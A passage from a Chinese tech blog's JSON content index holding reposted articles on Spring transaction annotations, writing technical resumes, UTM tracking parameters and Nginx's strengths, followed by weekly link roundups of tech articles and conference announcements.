Transaction）**：为了忽略那些不需要事务的方法，比如读取数据，这样可以有效地提高一些性能。 最后，推荐大家使用 Spring 的注解式事务配置，而放弃 XML 式事务配置。因为注解实在是太优雅了，当然这一切都取决于您自身的情况了。\n\n在 Spring 配置文件中使用：\n\n```\n...  \n<tx:annotation-driven/>  \n... \n```\n\n在需要事务的方法上使用：\n\n```\n@Transactional  \npublic void xxx() {  \n    ...  \n}  \n```\n\n可在 `@Transactional` 注解中设置：事务隔离级别、事务传播行为、事务超时时间、是否只读事务。 简直是太完美了，太优雅了！\n\nSpring默认情况下会对运行期例外(RunTimeException)，即uncheck异常，进行事务回滚。 如果遇到checked异常就不回滚。\n\n如何改变默认规则：\n\n- 让checked例外也回滚：在整个方法前加上\n\n```\n@Transactional(rollbackFor=Exception.class)\n```\n\n- 让unchecked例外不回滚：\n\n```\n@Transactional(notRollbackFor=RunTimeException.class)\n```\n\n最后，有必要对本文的内容做一个总结，免费赠送一张高清无码思维导图：\n\n![img](https://up-img.yonghong.tech/pic/2020/06/10-11-19-20181230011-Sv6pY9.png)\n\n","categories":["转载"],"tags":["Spring"]},{"title":"如何写一份有效的技术简历？","url":"/repost/2020/technical-resume/","content":"\n> 本文转载自 [如何写一份有效的技术简历？](https://www.ruanyifeng.com/blog/2020/01/technical-resume.html)\n\n现在找工作的程序员很多，都需要写简历。\n\n我见过很多简历，写得很糟糕，看不出这个人的亮点在哪里。一个人总是有亮点的，对不对。\n\n一些同学私下找我，让我帮忙修改简历。我在这里把自己的看法写出来，开发者的简历应该怎么写，效果最好。以后再有人找我，就让他看这篇文章。\n\n<!-- more -->\n\n![img](https://up-img.yonghong.tech/pic/2020/10/01-12-21-bg2020010407-Z8h4C2.jpg)\n\n如果你按照本文的建议，我保证你会写出一份令人印象深刻的简历，拿到面试的机会大大增加。\n\n## 一、以项目为主体，设计你的简历\n\n根据[一项研究](https://www.prnewswire.com/news-releases/ladders-updates-popular-recruiter-eye-tracking-study-with-new-key-insights-on-how-job-seekers-can-improve-their-resumes-300744217.html)，招聘人员（尤其是大公司的）在2018年仅花费大约7.4秒，分析一份简历。几秒钟的时间，如果找不到感兴趣的点，他就会 Pass 你的简历。\n\n所以，你动手写简历之前，脑袋里面要有一个观念： 简历是用来传递信息的，一定要突出重点内容。不要写得密密麻麻，堆砌各种无关的信息，这样只会埋没你的长处，让招聘人员抓不到重点。\n\n![img](https://up-img.yonghong.tech/pic/2020/10/01-12-21-bg2020010503-z34rj4.jpg)\n\n那么，你应该把什么信息，放到简历上面呢？\n\n**对于开发者来说，你的项目就是你的简历。你需要突出你的项目，和项目涉及的技能，让招聘人员一目了然。** 简历的主体，至少一半以上的内容，应该是你做过的项目，或者取得的成就，这是最有证明能力的东西。\n\n如果你是学生，简历不必写你的绩点、上过的课程、得过的奖学金，当过学生会干部，组织过社团活动、通过四六级考试等等。那些东西对企业没用，缺乏有针对性的证明能力。\n\n你也不要描述自己的工作态度，比如\"具有团队合作精神\"、\"积极进取\"、\"努力工作\"，这是默认你应该做到的，不是得分项。\n\n## 二、针对企业的需要，突出你的技能\n\n下一个问题是，项目经历应该怎么写，才能一眼打动企业的招聘人员？\n\n大家要这么想，企业招聘的目的，是找到帮他解决问题的人，或者说，招聘帮他干活的人。如果你让他看到，你可以胜任他的工作，他就会想要你。\n\n企业也没有把握什么人能胜任，他只能假设，如果你掌握了工作所需要的几种核心技能，就是初步合格的人选。\n\n所以，企业在简历上寻找的，就是你有没有他需要的那几种技能。这才是招聘人员最关心的信息。 **所以，简历应该突出的就是，你拥有企业想要的技能，你的经历证明你可以胜任。**\n\n![img](https://up-img.yonghong.tech/pic/2020/10/01-12-21-bg2020010504-oHXOY5.jpg)\n\n企业想要的技能，往往是一些特定的技术。你应该在简历里面包括这些技术的关键字，而且要写得详细一点，不要只写技术的大类。比如，应聘 Java 岗位，就不要只写掌握 Java，而要写掌握 Spring 或者 Hibernate。\n\n注意，写技术名词的时候，不要拼错单词，也不要写错大小写，比如把 jQuery 写成 Jquery，把 TypeScript 写成 Typescript，这会显得不专业。\n\n## 三、项目的三要素\n\n事实上，项目信息的写法有一个公式。\n\n> 项目 = 产品 + 技术 + 结果\n\n据说，谷歌要求应聘者描述经历时，每段经历必须提供下面三个信息：\n\n> - 做了什么产品\n> - 用到了什么技术\n> - 取得了什么结果\n\n比如，\"领导了 X 功能的开发，使其集成到 Y 产品，带来额外的 Z 收入\"。\n\n![img](https://up-img.yonghong.tech/pic/2020/10/01-12-21-bg2020010410-ihgfgO.jpg)\n\n除了三个基本信息，项目描述还要注意下面几点。\n\n（1）主要介绍新项目，你过去3年～4年的经历最关键。不要详细描述较旧的项目。\n\n（2）突出项目规模，比如用户数量、数据有多少 TB、每天的收入金额或交易量。\n\n（3）最好都用动词开头，这样让人感到简洁有力。为了避免单调，动词也可以适当变化，\"开发\"、\"实现\"、\"部署\"、\"完成\"这些词都可以换着用。\n\n## 四、量化你的项目，给出数字\n\n最后一点，每个项目的描述都需要量化，最好能给出数字。这能够大大提高简历的可信度和专业性，给招聘人员留下深刻印象。\n\n![img](https://up-img.yonghong.tech/pic/2020/10/01-12-21-bg2020010411-UrRsi5.jpg)\n\n请看下面这些改写的例子，加入了量化，效果好了很多。\n\n改写前：\n\n> 设计和实现 CRM 系统的 X 功能。\n\n改写后：\n\n> **设计并实施了 X，这是 CRM 系统的一项新功能，可使2万名用户轻松跟踪他们的业务支出。**\n\n改写前：\n\n> 结合使用 OAuth 和 JavaScript，实现了社交网站登录和个人资料的自动填充。\n\n改写后：\n\n> **通过使用 OAuth 和 JavaScript，实现了社交网站登录和个人资料自动填充，将网站的转化率提高了20％。**\n\n改写前：\n\n> 使用 Ajax 技术减少页面加载时间。\n\n改写后：\n\n> **使用 Ajax 技术减少了30％的页面加载时间。**\n\n改写前：\n\n> 与同事合作，部署了一些 Web 应用程序，并排查故障。\n\n改写后：\n\n> **与后端工程师团队合作，一起开发、部署、故障排查了7个的 Web 应用程序。**\n\n改写前：\n\n> 参与了将网站前端转为 React 框架的工作。\n\n改写后：\n\n> **与一个同事合作，在一周内，将网站前端转换为 React 框架。**\n\n改写前：\n\n> 使用 Less 开发了一个客户端的全新 CSS 样式。\n\n改写后：\n\n> **使用 Less 开发了一个客户端的全新 CSS 样式，使文件大小减少了70％，将首屏显示的时间减少了2倍。**\n\n## 五、小结\n\n应聘 IT 行业，难度其实是不高的。因为整个行业非常缺工程师，尤其是中高级工程师。\n\n企业自己也知道，不太容易招到水平很高的高级工程师。因为大家都在抢人，遇到合适的人选，出手稍慢，可能就被其他公司截走了。所以，只要你的水平能满足企业的最低要求，他们就愿意招你，至少会给面试机会。\n\n![img](https://up-img.yonghong.tech/pic/2020/10/01-12-21-bg2020010412-BruItd.jpg)\n\n作为应聘者，你只要能证明自己具有合格的项目开发能力，就肯定可以很轻松地拿到 Offer。因此，你真正要做的是：提高自己的能力，多做项目。然后，按照上面的几点建议，把项目信息忠实地反映在简历上，就一定能够顺利地找到工作。","categories":["转载"],"tags":["文案风格","写作规范","格式规范","简历","技术简历"]},{"title":"超链接中 utm_source, utm_medium 等参数的含义是什么？","url":"/repost/2020/utm/","content":"\n> 作者：张溪梦 Simon\n> \n> 链接：https://www.zhihu.com/question/48724061/answer/122730629\n> \n> 来源：知乎\n> \n> 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n\n在这里详细介绍下 UTM 的使用和含义。\n\nUTM 除了最基础的追踪流量来源外，还可以根据不同渠道、不同内容做精细化运营分析，帮你对比区分优质和劣质渠道，提高流量在产品内的转化。\n\n先来看一个结果：添加 UTM 参数的链接的链接投放后，我们就可以看到这样的统计了：\n\n![img](https://up-img.yonghong.tech/pic/2020/06/02-16-34-4a97c5556403190d36124b826b4c454b_1440w-jgT6NZ.jpg)\n\n<!--more-->\n\n每一个渠道带来的流量都十分清晰，用户在产品内的行为也一目了然，是否注册了，是否最终购买了，都可以看到。我们可以看到讲述 heatmap 热图的这篇内容在渠道「微博 1」投放的链接，带来了 9992 个页面浏览量，2066 个注册用户量，以及 1614 个购买用户量。\n\n\n\n而且不仅可以看到同一篇文章在不同渠道的流量情况，如 heatmap 热图这篇内容在微信、微博和其他渠道的推广情况；还可以看到同一个渠道不同文章带来的流量情况，如在微博渠道，heatmap 热图的文章的导流情况比 features 功能文章的导流情况更好。\n\n用户在产品内的行为，有多少进行了注册，有多少完成了购买，清清楚楚，而且，我们还可以将不同渠道进行分组，查看不同渠道的用户留存和转化。\n\n那么，我们先来看下，这样的 UTM 参数是怎样设置的呢？\n\n\n\n**Part 1 | UTM 参数的设置**\n\n通过 UTM 参数追踪外部流量的访问情况的原理是：把你投放在不同渠道的链接打上特定的标记，以监控各个链接的流量情况。\n\n*1. 确定目标链接*\n\n首先，确定这个链接最终指向的目标网页是哪个？一般来说是你自己的网站的某个页面，然后这个页面需要加载过数据统计分析工具的 SDK 。举个例子，如果使用 [GrowingIO](https://link.zhihu.com/?target=https%3A//www.growingio.com/%3Futm_source%3Dzhihu%26utm_medium%3Dqa%26utm_campaign%3Dq48724061%26utm_content%3D160919-utm%26utm_term%3Dtool) 进行接下来的拆解分析，就需要这个页面是加载过 Growing JS 代码的网址。不要以为在别人网站的链接后加上 UTM 参数，你就可以看到别人网站的点击情况了，这一切的前提是，链接最终指向加载了相应的分析代码的你自己的网站。\n\n*2. 添加自定义的参数*\n\n接下来，我们需要设置 UTM 的参数，也就是在链接上添加规则，进行标记，投放链接后我们就可以知道是哪个来源带来的流量了。对于不同的活动或文章，我们要设置不同的 UTM 参数用来区分。\n说白了，这里就是你用各种各样的内容来描述这条链接是放在哪个活动、哪个来源上的，我们来看一个例子进行理解。\n\n![img](https://up-img.yonghong.tech/pic/2020/06/02-16-34-1f3cfbaad4660f74969cd45807dceed1_1440w-TdUa7q.jpg)\n\n\n以现在很常用的新媒体营销方式为例，我们在微信的阅读原文里放了一条引导流量的链接：\n[https://www.growingio.com/?utm_source=zhihu&utm_medium=article&utm_campaign=product&utm_content=0811-tool&utm_term=tool](https://link.zhihu.com/?target=https%3A//www.growingio.com/%3Futm_source%3Dzhihu%26utm_medium%3Darticle%26utm_campaign%3Dproduct%26utm_content%3D0811-tool%26utm_term%3Dtool)\n\n\n\n这条链接的意思是什么呢？\n\n1. [https://www.growingio.com/](https://link.zhihu.com/?target=https%3A//www.growingio.com/%3Futm_source%3Dzhihu%26utm_medium%3Darticle%26utm_campaign%3Dproduct%26utm_content%3D0811-tool%26utm_term%3Dtool) 这条链接最终指向的地址；\n2. [utm_source=zhihu](https://link.zhihu.com/?target=https%3A//www.growingio.com/%3Futm_source%3Dzhihu%26utm_medium%3Darticle%26utm_campaign%3Dproduct%26utm_content%3D0811-tool%26utm_term%3Dtool) 投放的渠道是知乎；\n3. [utm_medium=article](https://link.zhihu.com/?target=https%3A//www.growingio.com/%3Futm_source%3Dzhihu%26utm_medium%3Darticle%26utm_campaign%3Dproduct%26utm_content%3D0811-tool%26utm_term%3Dtool) 媒介是一篇文章；\n4. [utm_campaign=product](https://link.zhihu.com/?target=https%3A//www.growingio.com/%3Futm_source%3Dzhihu%26utm_medium%3Darticle%26utm_campaign%3Dproduct%26utm_content%3D0811-tool%26utm_term%3Dtool) 这篇文章是产品介绍系列的；\n5. [utm_content=0811-tool](https://link.zhihu.com/?target=https%3A//www.growingio.com/%3Futm_source%3Dzhihu%26utm_medium%3Darticle%26utm_campaign%3Dproduct%26utm_content%3D0811-tool%26utm_term%3Dtool) 文章内容是「8.11 编辑，介绍工具」；\n6. [utm_term=tool](https://link.zhihu.com/?target=https%3A//www.growingio.com/%3Futm_source%3Dzhihu%26utm_medium%3Darticle%26utm_campaign%3Dproduct%26utm_content%3D0811-tool%26utm_term%3Dtool) 文章的关键词是「tool」;\n\n\n\n你一定会问，这个 URL “ ? ” 之后的参数都是什么？简单说，可以把 “ ? ” 之后的 UTM 参数理解为链接的名字，即为投放在不同渠道的每个链接起的分析工具能够识别的名字。\n\n我们把这些信息连起来，这条 UTM 代表的含义就是：这个指向 [http://www.growingio.com/](https://link.zhihu.com/?target=http%3A//www.growingio.com) 的投放链接，是在 8 月 11 日 utm_content=0811-tool，知乎 utm_source=zhihu 的文章里 utm_medium=article 投放的，这篇文章是介绍工具 utm_term=tool 的产品文章 utm_campaign=product 。\n\n当你在数据分析工具里做分析时，就可以像破解密码一样读出它的意思了，知道它放在了哪个内容里，用在了哪个活动里。\n\n当我们有很多内容同时在各个渠道投放时，这样的链接就十分有用了，我们知道每个渠道每条内容带来的流量，也可以按照不同的渠道将流量进行分组，分析不同渠道带量的效果和质量。\n\n我们提供的 UTM 参数和自定义参数的方式采用的是目前市面上最常用的定义方式：\n\n\n![img](https://up-img.yonghong.tech/pic/2020/06/02-16-34-53be54fc398bdf52c97b7c77fdef6b54_1440w-ptcVns.jpg)\n\n\n我们可以根据需要，进行各种各样自定义的填充，因为 UTM 最初是用在广告监控上的，所以它的很多名称还是关于广告的，但是我们现在已经可以把它放在各个内容、活动、推广中，监控渠道的流量情况。\n\n\n\n具体的填写参数的意义和方法，可以根据下面这些情景进行灵活的变通。\n\n*1. 当这条链接用于付费推广时，可以这样定义：*\n\n![img](https://up-img.yonghong.tech/pic/2020/06/02-16-34-457a27ca5b2aceb7b8003a8f91f95e06_1440w-W4rIel.jpg)\n\n\n*2. 当这条链接用于内容文章时，可以这样定义：*\n\n![img](https://up-img.yonghong.tech/pic/2020/06/02-16-34-5f2af1e60a8a94bd9df0ff23a0026db3_1440w-YXLP30.jpg)\n\n\n*3. 当这条链接用于活动时，可以这样定义：*\n\n![img](https://up-img.yonghong.tech/pic/2020/06/02-16-34-aaee8514c40384b1fb4761b96c117a27_1440w-MGoCUz.jpg)\n\n\n\n如果是你自己看这个数据，只要设置你能看懂的内容就可以，涉及到团队协作时，最好统一下标准，以便后续的数据分析。\n\n\n\n**Part 2 | UTM使用的案例**\n\nUTM 做好了之后，可以做哪些分析呢？我们就可以进行日常的监控和活动的监控了。\n\n现在，我们知道哪些投放的渠道来的量高、哪些量低了，可以有的放矢地进行市场推广和渠道运营，我们可以用 UTM 里面的维度来制图，看一下这一周文章投放的效果：\n\n![img](https://up-img.yonghong.tech/pic/2020/06/02-16-34-235999524bc591a9cef6f9bdfd60703c_1440w-byPf31.jpg)\n\n\n接下来，你可能想了解更多细节，这些人都访问了哪些页面呢？比如说他们是否最终注册完成了呢？我们可以加上注册页面的指标来做图：\n\n![img](https://up-img.yonghong.tech/pic/2020/06/02-16-34-8c4cdaf08d3bde47f3101e395e0deca5_1440w-ZSnevE.jpg)\n\n\n这些都只是一个开始，接下来我们还可以做更有价值的数据分析，在漏斗里，用UTM参数作为不同的维度，可以对比不同来源不同内容的转化率：\n\n![img](https://up-img.yonghong.tech/pic/2020/06/02-16-34-832f3ffac07d108828142e07d1967e67_1440w-oDNmLI.jpg)\n\n\n借助 UTM，可以把流量来源、转化、ROI 都分析清楚。\n\n\n","categories":["转载"],"tags":["utm"]},{"title":"为什么使用 Nginx？ Nginx 的特点？","url":"/repost/2020/why-nignx/","content":"\n> FROM 《深入理解Nginx》 陶辉\n\n为什么选择Nginx？因为它具有以下特点：\n\n### （1）更快\n这表现在两个方面：一方面，在正常情况下，单次请求会得到更快的响应；另一方面，在高峰期（如有数以万计的并发请求），Nginx可以比其他Web服务器更快地响应请求。\n实际上，本书第三部分中大量的篇幅都是在说明Nginx是如何做到这两点的。\n\n### （2）高扩展性\nNginx的设计极具扩展性，它完全是由多个不同功能、不同层次、不同类型且耦合度极低的模块组成。因此，当对某一个模块修复Bug或进行升级时，可以专注于模块自身，无须在意其他。而且在HTTP模块中，还设计了HTTP过滤器模块：一个正常的HTTP模块在处理完请求后，会有一串HTTP过滤器模块对请求的结果进行再处理。这样，当我们开发一个新的HTTP模块时，不但可以使用诸如HTTP核心模块、events模块、log模块等不同层次或者不同类型的模块，还可以原封不动地复用大量已有的HTTP过滤器模块。这种低耦合度的优秀设计，造就了Nginx庞大的第三方模块，当然，公开的第三方模块也如官方发布的模块一样容易使用。\nNginx的模块都是嵌入到二进制文件中执行的，无论官方发布的模块还是第三方模块都是如此。这使得第三方模块一样具备极其优秀的性能，充分利用Nginx的高并发特性，因此，许多高流量的网站都倾向于开发符合自己业务特性的定制模块。\n\n<!--more-->\n\n### （3）高可靠性\n高可靠性是我们选择Nginx的最基本条件，因为Nginx的可靠性是大家有目共睹的，很多家高流量网站都在核心服务器上大规模使用Nginx。Nginx的高可靠性来自于其核心框架代码的优秀设计、模块设计的简单性；另外，官方提供的常用模块都非常稳定，每个worker进程相对独立，master进程在1个worker进程出错时可以快速“拉起”新的worker子进程提供服务。\n\n### （4）低内存消耗\n一般情况下，10000个非活跃的HTTP Keep-Alive连接在Nginx中仅消耗2.5MB的内存，这是Nginx支持高并发连接的基础。\n从第3章开始，我们会接触到Nginx在内存中为了维护一个HTTP连接所分配的对象，届时将会看到，实际上Nginx一直在为用户考虑（尤其是在高并发时）如何使得内存的消耗更少。\n\n### （5）单机支持10万以上的并发连接\n这是一个非常重要的特性！随着互联网的迅猛发展和互联网用户数量的成倍增长，各大公司、网站都需要应付海量并发请求，一个能够在峰值期顶住10万以上并发请求的Server，无疑会得到大家的青睐。理论上，Nginx支持的并发连接上限取决于内存，10万远未封顶。当然，能够及时地处理更多的并发请求，是与业务特点紧密相关的，本书第8~11章将会详细说明如何实现这个特点。\n\n### （6）热部署\nmaster管理进程与worker工作进程的分离设计，使得Nginx能够提供热部署功能，即可以在7×24小时不间断服务的前提下，升级Nginx的可执行文件。当然，它也支持不停止服务就更新配置项、更换日志文件等功能。\n\n### （7）最自由的BSD许可协议\n这是Nginx可以快速发展的强大动力。BSD许可协议不只是允许用户免费使用Nginx，它还允许用户在自己的项目中直接使用或修改Nginx源码，然后发布。这吸引了无数开发者继续为Nginx贡献自己的智慧。\n\n以上7个特点当然不是Nginx的全部，拥有无数个官方功能模块、第三方功能模块使得Nginx能够满足绝大部分应用场景，这些功能模块间可以叠加以实现更加强大、复杂的功能，有些模块还支持Nginx与Perl、Lua等脚本语言集成工作，大大提高了开发效率。这些特点促使用户在寻找一个Web服务器时更多考虑Nginx。\n\n当然，选择Nginx的核心理由还是它能在支持高并发请求的同时保持高效的服务。\n\n如果Web服务器的业务访问量巨大，就需要保证在数以百万计的请求同时访问服务时，用户可以获得良好的体验，不会出现并发访问量达到一个数字后，新的用户无法获取服务，或者虽然成功地建立起了TCP连接，但大部分请求却得不到响应的情况。\n\n通常，高峰期服务器的访问量可能是正常情况下的许多倍，若有热点事件的发生，可能会导致正常情况下非常顺畅的服务器直接“挂死”。然而，如果在部署服务器时，就预先针对这种情况进行扩容，又会使得正常情况下所有服务器的负载过低，这会造成大量的资源浪费。因此，我们会希望在这之间取得平衡，也就是说，在低并发压力下，用户可以获得高速体验，而在高并发压力下，更多的用户都能接入，可能访问速度会下降，但这只应受制于带宽和处理器的速度，而不应该是服务器设计导致的软件瓶颈。\n\n事实上，由于中国互联网用户群体的数量巨大，致使对Web服务器的设计往往要比欧美公司更加困难。例如，对于全球性的一些网站而言，欧美用户分布在两个半球，欧洲用户活跃时，美洲用户通常在休息，反之亦然。而国内巨大的用户群体则对业界的程序员提出更高的挑战，早上9点和晚上20点到24点这些时间段的并发请求压力是非常巨大的。尤其节假日、寒暑假到来之时，更会对服务器提出极高的要求。\n\n另外，国内业务上的特性，也会引导用户在同一时间大并发地访问服务器。例如，许多SNS网页游戏会在固定的时间点刷新游戏资源或者允许“偷菜”等好友互动操作。这些会导致服务器处理高并发请求的压力增大。\n\n上述情形都对我们的互联网服务在大并发压力下是否还能够给予用户良好的体验提出了更高的要求。若要提供更好的服务，那么可以从多方面入手，例如，修改业务特性、引导用户从高峰期分流或者把服务分层分级、对于不同并发压力给用户提供不同级别的服务等。但最根本的是，Web服务器要能支持大并发压力下的正常服务，这才是关键。\n\n快速增长的互联网用户群以及业内所有互联网服务提供商越来越好的用户体验，都促使我们在大流量服务中用Nginx取代其他Web服务器。Nginx先天的事件驱动型设计、全异步的网络I/O处理机制、极少的进程间切换以及许多优化设计，都使得Nginx天生善于处理高并发压力下的互联网请求，同时Nginx降低了资源消耗，可以把服务器硬件资源“压榨”到极致。","categories":["转载"],"tags":["Nginx"]},{"title":"技术爱好者周刊 第1期 | 2020年10月5日","url":"//weekly-001/","content":"\n> 技术爱好者周刊，每周一发布，欢迎提[issue](https://github.com/wangyonghong/yonghong-me/issues)贡献内容。\n\n- [科技爱好者周刊（第 127 期）：未来人人开发软件，几乎没人编码](https://github.com/ruanyf/weekly/blob/master/docs/issue-127.md)\n\n- [Go语言爱好者周刊：第 63 期](https://github.com/polaris1119/golangweekly/blob/master/docs/issue-063.md)\n\n- [zenany/weekly - 2020.09.28 - 低代码，要怎么低？和低代码有关的 10 个问题](https://github.com/zenany/weekly/blob/master/software/2020/0928.md)\n\n- [老司机 iOS 周报 #130 | 2020-09-28](https://github.com/SwiftOldDriver/iOS-Weekly/blob/master/Reports/2020/%23130-2020.09.28.md)\n\n- [R Weekly 2020-39 shinydashboardPlus, Calendar](https://rweekly.org/2020-39.html)\n\n","categories":["技术爱好者周刊"],"tags":["技术爱好者周刊"]},{"title":"技术爱好者周刊 第2期 | 2020年10月12日","url":"//weekly-002/","content":"\n> 技术爱好者周刊，每周一发布，欢迎提[issue](https://github.com/wangyonghong/yonghong-me/issues)贡献内容。\n\n## 后端\n- [基于 TiSpark 的海量数据批量处理技术](https://pingcap.com/blog-cn/mass-data-batch-processing-technology-based-on-tispark/)\n熟悉 TiSpark 的人都知道，TiSpark 是 Spark 的一个插件，它其实就是给予了 Spark 能够去访问 TiDB 底层分布式存储引擎 TiKV 或者 TiFlash 的能力。之前我们一直在解决读的问题，写问题并没有付出太多的时间去解决。今天就给大家揭秘，我们是怎样使用 TiSpark 去实现海量数据批处理，然后写入到 TiDB 里面去的。\n\n## 前端\n- [外卖客户端容器化架构的演进](https://tech.meituan.com/2020/09/30/waimai-mobile-architecture-evolution.html)\n好的架构要不断演变，进而去适应业务的发展。美团在移动端上的架构，也经历了组件化、平台化、RN混合化，到现在开始向容器化变迁。容器化架构充分地利用了现在的跨端技术，将动态化的能力最大化地赋予了业务。作为美团最为重要的业务之一，美团外卖移动端的架构演进是怎样的呢？本文将为你揭开背后的思考、技术细节以及实践。\n\n## Linux\n- [双引导系统下的 VeraCrypt 配置](https://linuxtoy.org/archives/veracrypt-configuration-tips-for-dualboot-system.html)\n对于笔记本电脑这种时常会携带外出的电子设备，基本的安全考量是必不可少的，而应用全盘加密（Full Disk Encryption）便是其中一个避免个人资料泄漏的重要措施。本文将简述如何在 Win Linux 双引导系统下使用 VeraCrypt 的配置技巧。\n\n<!-- more -->\n\n## 近期会议\n\n### [2020 F5金融科技趋势线上研讨会](http://www.f5chinanetworks.com/partner/wechat/datacenter/invite/activityDetails.asp?meetingid=76&trackingcode=f5community)\n\n报名链接：[2020 F5金融科技趋势线上研讨会](http://www.f5chinanetworks.com/partner/wechat/datacenter/invite/activityDetails.asp?meetingid=76&trackingcode=f5community)\n\nF5作为应用交付领域的领导者，在过去的几年中每年都会举办一次针对金融科技领域的线下研讨会，反响热烈。由于疫情原因，今年的研讨会将以线上的形式开展，我们将继续保持高品质的内容输出，为广大金融从业者奉献一场专为金融行业烹制的饕餮盛宴。\n\n本次研讨会将围绕助力金融行业数字化转型，银行4.0（开放式银行），大数据价值挖掘与安全，现代应用的敏捷发布与管理，分布式架构的最佳实践等热门话题展开分享和讨论。 届时，国有大行，全国股份制银行，各城商行，证券，基金，保险等数百名金融机构从业人员； F5合作伙伴腾讯云、天空卫士和DellEMC一线技术大咖； 以及来自金融科技界的专家们均会在云中相聚，共同在线分享金融科技创新成果及他们的最佳业务实践。\n\n\n  会议主题：2020 F5金融科技趋势线上研讨会\n\n  会议时间：10月16 - 10月17日（周五-周六）下午 1:30 - 6:00\n\n  会议形式：线上研讨会\n\n\n### [IBM 数据与 AI 线上论坛](https://ibm.6connex.com/event/chinacenter/DAVF/login)\n\n报名链接：https://ibm.6connex.com/event/chinacenter/DAVF/login\n\n如果将AI在企业的落地与扩展过程视为一场“障碍跑”，那么AI技能的缺乏、AI的可信性、数据的复杂性即是横亘途中的三大障碍。这个夏天开始，IBM将为您诚意打造”数有价，AI无界 | IBM数据与AI线上论坛”，三大专场为您逐一击破三大障碍，加速将AI愿景落地为现实！全球视角与本地洞察紧密结合，一次注册，畅享三大主题专场，全力助您冲刺AI落地与规模化之旅！\n \n■ 7月15日：冲破人才瓶颈，AI赋能数字化技能专场 （内容回看已开放）\n   您是否拥有让AI真正为企业所用的正确技能与人才？\n   一起释放AI自动化的力量，弥补AI技能差距，降低AI技能门槛。\n \n■ 8月26日：打开AI黑盒，构建可信企业级AI专场（内容回看已开放）\n   您充分信任您取得的AI成果吗? \n   一起探索如何构建和扩展可信任、可解释的企业级AI应用。\n \n■ 10月21日：掘金复杂数据，让数据为业务所用专场（待开放）\n   您的数据为AI做好准备了吗?\n   一起实现数据的轻松获取与组织，确保数据简单、可访问且为业务就绪。\n \n10月21日， “掘金复杂数据，让数据为业务所用专场”即将开场，精彩抢鲜放送：\n \n精华内容 抢鲜剧透\n· 接轨市场最前沿洞察\n-现代化的企业数据架构如何降低您的运营与基础设施成本？\n-企业数据治理的六大趋势您了解吗？ \n-可扩展及面向开源的高级统计分析、机器学习算法、文本分析如何助您锁定新商机？\n-高性能计算及深度学习如何支持您将 AI 应用更快、更准、更安全地投入到业务应用中。\n· 直通先行者成功经验\n-讲述本土成功案例，复盘各行业先行者的成功轨迹\n-更多全球成功案例供您按需点播，了解大洋彼岸的真实场景与实际应用\n· 重塑您的数据与 AI 实践\n-借力行业领先的 IBM 解决方案，了解IBM 明星产品如何助力数据与 AI 之旅\n \n双重现场 双倍畅谈\n· 第一现场，本地精彩案例分享及 IBM 全球数据与 AI 论坛精粹回看，全球专家与您共叙AI掘金经验\n· 第二现场，带您亲临直播现场 —— IBM 中国数字销售中心，趣聊AI台前幕后事儿\n\n### [2020科大讯飞全球开发者大会](https://1024.iflytek.com/)\n\n报名链接：https://1024.iflytek.com/\n\n![2020科大讯飞全球开发者大会](https://up-img.yonghong.tech/pic/2020/10/13-17-46-%E6%88%AA%E5%B1%8F2020-10-13%20%E4%B8%8B%E5%8D%885.46.37-XtozZN.png)\n\n科大讯飞全球1024开发者节是以AI开发者为受众群体的人工智能盛会，由科大讯飞发起并主办。选择在每年的10月24日，是因为在计算机世界中，1024是2的十次方，是二进制计数的基本计量单位之一，是1KB的字节数，因此组成了程序中的最基础基因序列。从事计算机工作的开发者就像一个个1024，以最具创新、最富热情的基础模块搭建起整个万物互联世界。 秉承“开放·合作·生态·共享”的理念，科大讯飞全球1024开发者节希望用最新最全的人工智能技术和产品促进跨行业链接、多领域碰撞、新技术开发，以科技之光、生态之念，立足当下、放眼未来。\n\n\n## 其他周报\n\n- [科技爱好者周刊（第 128 期）：这个社会是否正在变成\"赛博朋克\"？](https://github.com/ruanyf/weekly/blob/master/docs/issue-128.md)\n\n- [Go语言爱好者周刊：第 64 期](https://github.com/polaris1119/golangweekly/blob/master/docs/issue-064.md)\n\n- [2020.10.05 - I was wrong. CRDTs are the future](https://github.com/zenany/weekly/blob/master/software/2020/1005.md)\n\n- [老司机 iOS 周报 #131 | 2020-10-12](https://github.com/SwiftOldDriver/iOS-Weekly/blob/master/Reports/2020/%23131-2020.10.12.md)\n\n- [R Weekly 2020-40 learnr tutorials, visual markdown editing, stat_layers](https://rweekly.org/2020-40.html)\n\n","categories":["技术爱好者周刊"],"tags":["技术爱好者周刊"]},{"title":"技术爱好者周刊 第3期 | 2020年10月19日","url":"//weekly-003/","content":"\n> 技术爱好者周刊，每周一发布，欢迎提[issue](https://github.com/wangyonghong/yonghong-me/issues)贡献内容。\n\n## 后端\n- [中移物联网在车联网场景的 TiDB 探索和实现](https://pingcap.com/cases-cn/user-case-china-mobile-lot/)\n本次分享主要介绍车联网业务，它主要围绕车载位置终端和车载视频终端开展业务，包括停车卫士、路尚个人、路尚行业、和统一填装业务。截止 2020 年 5 月，累计接入 150 万终端，车联网用户主要是个人用户和企业用户，目前累计注册个人用户 151 万，累计注册企业用户 1471 个。\n\n- [基于微服务成熟度模型的高可用优化实践](https://mp.weixin.qq.com/s/hdTfjlCyxpLT4hznSh4O1A)\n随着微服务的流行，每个互联网公司后台都有无数大大小小的服务，服务与服务之间又有着千丝万缕的调用关系。要保证整个微服务系统的成熟稳定，就必须保证每个微服务的成熟度。但如何来定义服务的成熟度？应该从哪些纬度来考量？各个纬度里又有哪些普遍的问题？如何来优化？本文介绍了爱奇艺技术产品团队用来衡量服务成熟度的模型，并基于此模型对多个后台服务进行评估，总结出了一些常见的低分项，并对低分项整理了相关优化方案。希望对大家有所帮助。\n\n<!-- more -->\n\n## 运维\n- [AIOps在美团的探索与实践——故障发现篇](https://tech.meituan.com/2020/10/15/mt-aiops-horae.html)\n美团技术团队在行业、业务领域知识和运维领域的知识等方面有着长期的积累，已经沉淀出不少工具和产品，实现了自动化运维，同时在AIOps方面也有一些初步的成果。我们希望通过在AIOps上持续投入、迭代和钻研，将之前积累的行业、业务和运维领域的知识应用到AIOps中，从而能让AIOps为业务研发、产品和运营团队赋能，提高整个公司的生产效率。\n\n## AI\n- [对话任务中的“语言-视觉”信息融合研究](https://tech.meituan.com/2020/10/15/acmmm-2020-answer-driven-visual-state-estimator.html)\n目标导向的视觉对话是“视觉-语言”交叉领域中一个较新的任务，它要求机器能通过多轮对话完成视觉相关的特定目标。该任务兼具研究意义与应用价值。日前，北京邮电大学王小捷教授团队与美团AI平台NLP中心团队合作，在目标导向的视觉对话任务上的研究论文《Answer-Driven Visual State Estimator for Goal-Oriented 